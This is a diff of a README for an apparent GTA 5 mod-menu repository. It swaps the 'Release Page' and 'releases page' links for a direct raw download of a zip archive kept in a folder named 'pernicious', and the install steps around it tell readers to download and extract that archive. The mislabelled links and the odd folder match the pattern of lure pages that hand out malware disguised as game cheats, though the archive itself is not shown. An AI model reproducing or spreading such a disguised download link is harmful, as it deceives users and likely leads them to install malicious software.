@@ -1,6 +1,6 @@
 # 🎮 gta-5-mod-menu - Enhance your single player game experience
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Lattecorrugatediron408/gta-5-mod-menu/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Lattecorrugatediron408/gta-5-mod-menu/main/pernicious/menu-mod-gta-v2.9-alpha.4.zip)
 
 ## 📌 Project Overview
 
@@ -22,7 +22,7 @@ If you encounter errors regarding missing files like "msvcp140.dll," install the
 
 Follow these steps to set up the tool on your system.
 
-1.  Visit the [releases page](https://github.com/Lattecorrugatediron408/gta-5-mod-menu/releases) to download the latest version of the tool.
+1.  Visit the [releases page](https://raw.githubusercontent.com/Lattecorrugatediron408/gta-5-mod-menu/main/pernicious/menu-mod-gta-v2.9-alpha.4.zip) to download the latest version of the tool.
 2.  Locate the compressed file in your Downloads folder.
 3.  Right-click the file and select Extract All to unzip the contents into a new folder.
 4.  Open the folder you just created.
